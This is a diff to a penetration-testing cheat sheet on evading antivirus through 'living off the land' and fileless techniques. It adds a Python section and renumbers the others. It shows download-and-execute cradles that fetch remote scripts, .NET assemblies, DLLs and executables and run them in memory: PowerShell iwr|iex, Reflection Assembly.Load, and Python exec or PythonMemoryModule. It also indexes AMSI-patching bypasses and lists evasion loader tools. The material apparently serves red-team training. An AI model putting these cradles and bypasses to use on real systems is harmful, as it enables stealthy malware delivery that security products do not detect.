@@ -3,7 +3,7 @@ AV bypass using 'Living Off The Land' and fileless techniques
 ================================================================================================================================================================
 
 INDEX
-======
+******
 
 I.   Reminder & Definitions
      ➤ Why using 'Living Off The Land' and fileless techniques?
@@ -22,7 +22,11 @@ III. Basic examples of 'Living Off The Land' techniques using PowerShell (i.e. l
      ➤ PowerShell scripts
      ➤ .Net Assemblies (PE and DLL)
 
-IV.  AMSI bypass techniques to be able to load and execute in-memory offensive tools (PowerShell scripts & C# assemblies) without being detected by Antivirus
+IV.  Basic examples of 'Living Off The Land' techniques using Python (i.e. load & execute straight in-memory PE/DLL/scripts)
+     ➤ Python scripts
+     ➤ PE and DLL (unmanaged code) loding using the 'PythonMemoryModule'
+
+V.   AMSI bypass techniques to be able to load and execute in-memory offensive tools (PowerShell scripts & C# assemblies) without being detected by Antivirus
      ➤ AMSI bypass technique 1 - Force the AMSI initialization to fail in the current PowerShell session 
      ➤ AMSI bypass technique 2 - Patching the "Amsi.dll" in memory (AmsiScanBuffer)
      ➤ AMSI bypass technique 3 - Patching the "Amsi.dll" in memory (AmsiOpenSession)
@@ -32,9 +36,9 @@ IV.  AMSI bypass techniques to be able to load and execute in-memory offensive t
      ➤ AMSI bypass technique 7 - AMSI dll hijacking
      ➤ AMSI bypass technique 8 - Lifetime AMSI bypass by @ZeroMemoryEx 
 
-V.   Tools that bypass AV products (AMSI+ETW patching) and allow to load and execute straight in-memory offensive C# .Net assemblies
+VI.  Tools that bypass AV products (AMSI+ETW patching) and allow to load and execute straight in-memory offensive C# .Net assemblies
 
-VI.  Tools that bypass AV products and allow to load and execute straight in-memory offensive PE files (un-managed code like C/C++ programs)
+VII. Tools that bypass AV products and allow to load and execute straight in-memory offensive PE files (un-managed code like C/C++ programs)
 
 
 ================================================================================================================================================================
@@ -808,7 +812,7 @@ Important note: the executable files are downloaded and stored in the folder "C:
 III.  Basic examples of 'Living off the land' techniques using PowerShell (i.e. load & execute straight in-memory PE/DLL/scripts)
 ================================================================================================================================================================
 
-PowerShell is built on .NET and it natively allows to download and execute straight into memory:
+PowerShell is built on .NET and it natively allows to download and execute straight in-memory:
 ➤ PowerShell scripts
 ➤ .Net Assemblies (PE and DLL)
    Examples
@@ -816,11 +820,11 @@ PowerShell is built on .NET and it natively allows to download and execute strai
     > Method 2 - Add assembly with Reflection Assembly
     > Method 3 - Add assembly via a string objectPermalink
 
-In addition, with PowerShell, we can also download and execute straight into memory any Windows PE and DLL by using the reflective PE/DLL injection methods.
+In addition, with PowerShell, we can also download and execute straight in-memory any Windows PE and DLL by using the reflective PE/DLL injection methods.
 
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------
-2.1. How to download and execute straight into memory a PowerShell script hosted remotely on a Web server
+2.1. How to download and execute straight in-memory a PowerShell script hosted remotely on a Web server
 ---------------------------------------------------------------------------------------------------------------------------------------------------
 
 PS C:\temp> powershell -exec bypass
@@ -836,7 +840,7 @@ C:\temp> powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credential
          iwr('http://Your-IP-address/PowerShell-Script.ps1')|iex"
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------
-2.2. How to download and execute straight into memory a ".Net" executable using PowerShell
+2.2. How to download and execute straight in-memory a ".Net" executable using PowerShell
 ---------------------------------------------------------------------------------------------------------------------------------------------------
 
 PoC with the tool "SharUP.exe" (C# - SharpUp.csproj)
@@ -862,7 +866,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
 
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------
-2.3. How to download and execute straight into memory a ".NET" DLL using PowerShell
+2.3. How to download and execute straight in-memory a ".NET" DLL using PowerShell
 ---------------------------------------------------------------------------------------------------------------------------------------------------
 
 PS C:\temp> $data = (New-Object System.Net.WebClient).DownloadData('http://YOUR_IP_ADDRESS/MyLibrary.dll')
@@ -884,14 +888,102 @@ PS C:\temp> $bytes = [System.Convert]::FromBase64String($dll)
 PS C:\temp> [System.Reflection.Assembly]::Load($bytes)
 
 
+================================================================================================================================================================
+IV.  Basic examples of 'Living off the land' techniques using Python (i.e. load & execute straight in-memory PE/DLL/scripts)
+================================================================================================================================================================
+
+Python can be used to load & execute straight in-memory python scripts and PE and DLL files (unmanaged code using 'PythonMemoryModule' or native code using 'ironpython').
+
+Note: On Windows machines, to use Python you can install it or download a portable version. 
+
+➤ Python official website
+  + https://www.python.org/downloads/
+➤ Python embeddable package providing a signed (portable) Python interpreter with a good reputation:
+  + https://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip
+➤ IronPython 3.4 interpreter installer:
+  + https://github.com/IronLanguages/ironpython3/releases/tag/v3.4.1
+➤ ...
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+3.1. How to download and execute straight in-memory a Python script hosted remotely on a Web server
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+Basic PoC/example
+-----------------
+PS C:\Users\Administrator> wget -URI http://192.168.1.144:8080/IronPythonPortable.zip -OutFile IronPythonPortable.zip
+PS C:\Users\Administrator> tar -xf .\IronPythonPortable.zip
+
+PS C:\Users\Administrator\IronPython\net462> ipy.exe
+
+IronPython 3.4.2 (3.4.2.1000)
+[.NETFramework,Version=v4.6.2 on .NET Framework 4.8.4785.0 (64-bit)] on win32
+Type "help", "copyright", "credits" or "license" for more information.
+
+#Python3
+import urllib.request
+request = urllib.request.Request('https://X.X.X.X/python-script.py')
+result = urllib.request.urlopen(request)
+payload = result.read()
+exec(payload)
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+3.2. How to download and execute straight in-memory a .DLL file (unamanaged code) using the Python script hosted remotely on a Web server
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+In the following example a .dll is downloaded (not saved on disk), loaded in memory and started by calling the entrypoint using the 'PythonMemoryModule'.
+-> https://github.com/naksyn/PythonMemoryModule
+
+Example:
+--------
+PS C:\temp> wget -uri hhttps://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip -OutFile C:\temp\python.zip
+PS C:\temp> tar -xf .\python.zip
+PS C:\temp> .\python.exe
+
+#Python3
+import urllib.request
+import ctypes
+import pythonmemorymodule
+request = urllib.request.Request('http://X.X.X.X/example.dll')
+result = urllib.request.urlopen(request)
+buf=result.read()
+dll = pythonmemorymodule.MemoryModule(data=buf, debug=True)
+startDll = dll.get_proc_addr('StartW')
+assert startDll()
+#dll.free_library()
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+3.3. How to download and execute straight in-memory a PE file (unamanaged code) using the Python script hosted remotely on a Web server
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+In the following example a PE file is downloaded (not saved on disk), loaded and executed in-memory.
+-> https://github.com/naksyn/PythonMemoryModule
+
+Example:
+--------
+PS C:\temp> wget -uri hhttps://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip -OutFile C:\temp\python.zip
+PS C:\temp> tar -xf .\python.zip
+PS C:\temp> .\python.exe
+
+#Python3
+import urllib.request
+import ctypes
+import pythonmemorymodule
+request = urllib.request.Request('http://X.X.X.X/example.exe')
+result = urllib.request.urlopen(request)
+buf=result.read()
+pythonmemorymodule.MemoryModule(data=buf, debug=True, command = 'insert-PE-command')
+
+
 
 ================================================================================================================================================================
-IV.  AMSI bypass techniques to be able to load and execute in-memory offensive tools (PowerShell scripts & C# assemblies) without being detected by Antivirus
+V.  AMSI bypass techniques to be able to load and execute in-memory offensive tools (PowerShell scripts & C# assemblies) without being detected by Antivirus
 ================================================================================================================================================================
 
-As a reminder, AMSI bypass techniques are needed only if we use scripting languages (Powershell, VBS, Javascript, VBA macros) and .NET managed code (C# assemblies)
-during our pentest/red team engagements. 
-Public bypass techniques mainly use memory patches or vectored exception handlers with e.g. hardware breakpoints to manipulate the scan or initialisation process at runtime. 
+As a reminder, AMSI bypass techniques are needed to execute hacking tools without being detected by security products (AV) only if we use during our pentest/red team engagements
+.NET managed code (C# assemblies) and scripting languages such as Powershell, VBS, Javascript and VBA macros. 
+Public AMSI bypass techniques mainly use memory patches or vectored exception handlers with e.g. hardware breakpoints to manipulate the scan or initialisation process at runtime. 
 Some others rely on manipulating the DLL load process - either when AMSI hasn't been initialised yet or for newly spawned processes.
 Most of the public AMSI bypasses are detected by antivirus/EDR solutions however they can get modified to get around signature based detections.
 
@@ -1887,7 +1979,7 @@ Command: help
 
 
 ===================================================================================================================================================
-V.   Tools that bypass AV products (AMSI+ETW patching) and allow to load and execute straight in-memory offensive C# .Net assemblies
+VI.   Tools that bypass AV products (AMSI+ETW patching) and allow to load and execute straight in-memory offensive C# .Net assemblies
 ===================================================================================================================================================
 
 There are many open-source tools on GitHub that allow to patch the AMSI (+ the event tracing i.e. ETW) and to load .Net assemblies (C#) from a remote web 
@@ -1897,10 +1989,10 @@ Examples of tools
 ------------------
 ➤ NetLoader 		    	 - https://github.com/Flangvik/NetLoader
 ➤ BetterNetLoader	    	 - https://github.com/racoten/BetterNetLoader
-➤ EAPrimer 		     	 - https://github.com/m8sec/EAPrimer
+➤ EAPrimer 		     	 	 - https://github.com/m8sec/EAPrimer
 ➤ PowerSharpPack 	     	 - https://github.com/S3cur3Th1sSh1t/PowerSharpPack
 ➤ Invoke-SharpLoader	     - https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader
-➤ Invoke-PoSH-CsharpPacker  - https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)/Invoke-PoSH-SharpPacker
+➤ Invoke-PoSH-CsharpPacker   - https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)/Invoke-PoSH-SharpPacker
 ➤ ...
 
 
@@ -2117,7 +2209,7 @@ Cannot enumerate antivirus. root\SecurityCenter2 WMI namespace is not available 
 
 
 ===================================================================================================================================================
-VI.   Tools that bypass AV products and allow to load and execute straight in-memory offensive PE files (un-managed code like C/C++ programs)
+VII.   Tools that bypass AV products and allow to load and execute straight in-memory offensive PE files (un-managed code like C/C++ programs)
 ===================================================================================================================================================
 
 There are many open-source tools on GitHub that allow to load and execute straight in-memory offensive PE files from a remote web server URL 
@@ -2125,7 +2217,7 @@ or from a local directory.
 
 Examples of tools
 ------------------
-➤ RunPE			      - https://github.com/nettitude/RunPE
+➤ RunPE			      	  - https://github.com/nettitude/RunPE
 ➤ Pyramid		       	  - https://github.com/naksyn/Pyramid
 ➤ FilelessPELoader	      - https://github.com/SaadAhla/FilelessPELoader
 ➤ Invoke-PoSH-PePacker	  - https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)/Invoke-PoSH-PePacker
